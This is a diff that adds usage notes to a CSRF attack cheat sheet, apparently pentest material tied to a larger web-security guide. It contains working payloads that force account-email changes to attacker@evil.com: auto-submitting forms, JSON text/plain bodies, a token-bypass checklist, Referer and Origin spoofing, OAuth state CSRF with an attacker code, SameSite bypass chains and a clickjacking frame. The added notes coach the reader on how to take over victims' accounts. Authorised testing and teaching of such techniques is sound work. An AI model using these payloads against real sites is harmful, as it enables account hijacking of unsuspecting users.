@@ -4,6 +4,8 @@
 
 ---
 
+*What & when:* start every CSRF test here — the cookie's SameSite value decides which templates below can *possibly* fire in a real browser. Read it (DevTools → Application → Cookies), match it to the row, and only reach for a template the row allows. Skipping this is why most CSRF PoCs fail silently.
+
 ## A. The SameSite decision matrix (guide §2.3 / §6) — read this BEFORE picking a template
 
 | Session cookie SameSite | Cross-site POST/JSON/fetch | Cross-site top-level GET nav | Use |
@@ -20,6 +22,9 @@ DevTools → Application → Cookies → read SameSite/Secure/HttpOnly/Domain on
 ---
 
 ## B. Auto-submit POST form (needs SameSite=None) (guide §23.2)
+
+*What & when:* the classic CSRF PoC — a hidden form that submits itself the moment the victim opens the page. **Only works if the session cookie is `SameSite=None`** (under default Lax the browser won't attach the cookie to this cross-site POST). Use for the common "change email/password" POST actions once you've confirmed None.
+
 ```html
 <html><body>
 <form id="f" action="https://target.com/account/email" method="POST">
@@ -31,6 +36,9 @@ DevTools → Application → Cookies → read SameSite/Secure/HttpOnly/Domain on
 ```
 
 ## C. GET state-change under Lax (top-level navigation) (guide §6.1)
+
+*What & when:* your go-to against the modern default (Lax). If a sensitive action accepts **GET**, a top-level navigation (`window.location` / a GET form) still carries the cookie under Lax — so this fires where a POST form can't. Remember: it must be a *navigation*; `<img>`/`<iframe>`/`fetch` are background requests and Lax withholds the cookie from them.
+
 ```html
 <!-- Lax SENDS the cookie on top-level GET navigation. Use for GET-based sensitive actions. -->
 <script>window.location = "https://target.com/account/email/change?email=attacker@evil.com";</script>
@@ -44,6 +52,9 @@ DevTools → Application → Cookies → read SameSite/Secure/HttpOnly/Domain on
 ```
 
 ## D. JSON CSRF — text/plain trick (guide §8/§13)
+
+*What & when:* use against a JSON API when you can't send `application/json` from a form (and a `fetch` would preflight). First just try urlencoded (the second snippet — many JSON APIs accept it). If not, the `text/plain` form shapes a body that *is* valid JSON, CSRFing the endpoint with no JavaScript — works only if the server leniently parses text/plain as JSON.
+
 ```html
 <!-- A form can only send urlencoded/multipart/text/plain. This builds a valid JSON body via text/plain. -->
 <form action="https://target.com/api/account/email" method="POST" enctype="text/plain">
@@ -81,6 +92,9 @@ fetch('https://target.com/api/account/email', {
 ---
 
 ## G. Anti-CSRF token bypass tests (guide §5)
+
+*What & when:* run this whole list whenever a token stands in your way — a token only protects if it's *checked* and *bound to the victim*. The two highest-yield tests: delete the param entirely (often "checked only if present"), and paste **your own** account's token into the victim's request (often "any valid token accepted"). Either success = the token is decorative.
+
 ```
 □ Remove the token param entirely → submit → accepted?
 □ Send token = "" (empty) → accepted?
@@ -92,6 +106,9 @@ fetch('https://target.com/api/account/email', {
 ```
 
 ## H. Referer / Origin bypass (guide §7)
+
+*What & when:* use when the server checks where the request came from. The #1 win: many servers only validate the Referer *if it's present* and accept it when absent — so strip it (`<meta name="referrer" content="no-referrer">`) and the check passes. Otherwise exploit sloppy substring/suffix matching (`target.com.evil.com`) or a `null` Origin via a sandboxed iframe.
+
 ```html
 <!-- Strip Referer (server "allows if absent") -->
 <meta name="referrer" content="no-referrer">
@@ -110,6 +127,9 @@ Origin null:
 ```
 
 ## I. SameSite=Strict → same-site position (guide §6.4)
+
+*What & when:* use when the cookie is `SameSite=Strict` (cross-site dead). Since SameSite is per-*site* not per-origin, any code running on a `*.target.com` subdomain (an XSS there, or a subdomain takeover) issues *same-site* requests that carry the Strict cookie. This turns "Strict = safe" into a CSRF + subdomain-bug chain.
+
 ```
 Need a request from *.target.com (same site as target.com). Get it via:
   - XSS on any subdomain (run the fetch/form from there) — see XSS guide
@@ -118,6 +138,9 @@ Then a normal same-site request carries the cookie even under Strict.
 ```
 
 ## J. OAuth state CSRF (account linking) (guide §15)
+
+*What & when:* use on "Login/Connect with Google" flows whose callback doesn't validate `state` (OAuth's own CSRF token). Force the victim to complete a link to *your* identity provider account → then you sign in as them. Frequently missed and high-impact.
+
 ```html
 <!-- If the OAuth callback ignores `state`, force the victim to complete an attacker-initiated link: -->
 <img src="https://target.com/oauth/callback?code=ATTACKER_AUTH_CODE&state=anything">
@@ -159,6 +182,8 @@ python3 -m http.server 8000   # http://localhost:8000/poc.html
 ```
 
 ## N. SameSite Lax / Strict bypass depth (guide §6) — the modern battleground
+
+*What & when:* your toolbox for when default-Lax (or Strict) is blocking a POST — this is where most 2026 CSRF actually lives. Reach for these in order of ease: a GET-reachable version of the action, the fresh-cookie 2-minute POST window, a same-site subdomain foothold, an on-site client-side redirect gadget, or a 307/308 method-preserving redirector.
 
 > Browsers default cookies to **Lax**, so "classic" POST CSRF often fails. These are the real bypasses that revive it:
 
@@ -229,6 +254,9 @@ python3 -m http.server 8000   # http://localhost:8000/poc.html
 ```
 
 ## R. Clickjacking-assisted CSRF — when the token can't be scripted (Guide §10.5)
+
+*What & when:* use when a valid, unguessable token means you *can't* forge the request blind — **but** the real settings page is framable (no `X-Frame-Options`/`frame-ancestors`). You frame the genuine page (which carries the victim's real token) invisibly and trick them into clicking the real submit button. Note the SameSite caveat: the framed page is a sub-resource, so this needs `SameSite=None` (or a same-site position) for the cookie to reach it.
+
 ```html
 <!-- Works when: the settings page is FRAMABLE (no X-Frame-Options / no CSP frame-ancestors) AND the cookie reaches the
      framed sub-resource (SameSite=None, or you're same-site). The framed REAL page carries the victim's REAL token;
